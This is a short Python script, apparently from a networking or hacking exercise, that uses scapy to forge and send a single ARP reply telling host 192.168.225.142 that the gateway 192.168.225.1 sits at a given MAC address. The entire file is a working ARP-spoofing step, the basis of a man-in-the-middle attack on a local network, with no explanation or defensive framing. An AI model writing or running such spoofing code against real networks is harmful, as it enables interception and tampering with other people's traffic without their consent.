#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.225.142", hwdst="04:b1:67:d0:33:a9", psrc="192.168.225.1")
scapy.send(packet)
